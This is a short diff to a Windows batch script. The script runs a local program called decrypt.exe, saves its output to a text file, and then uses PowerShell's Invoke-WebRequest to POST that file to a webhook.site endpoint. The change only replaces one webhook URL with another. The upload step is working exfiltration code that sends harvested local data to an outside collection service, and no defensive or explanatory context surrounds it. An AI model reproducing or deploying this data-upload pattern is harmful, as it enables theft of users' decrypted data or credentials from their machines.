@@ -12,7 +12,7 @@ start cmd.exe /k powershell -command "C:/Users/Decrypt/decrypt.exe | Out-File -F
 
 timeout /t 10
 
-start cmd.exe /k powershell -command Invoke-WebRequest -Uri https://webhook.site/d0a68a33-1ba9-4211-8592-ac95766d4003 -Method POST -InFile C:/Users/Decrypt/decrypt.txt;"
+start cmd.exe /k powershell -command Invoke-WebRequest -Uri https://webhook.site/d88d2a13-c8c0-4188-8ec8-a98aac003082 -Method POST -InFile C:/Users/Decrypt/decrypt.txt;"
 
 timeout /t 5
 
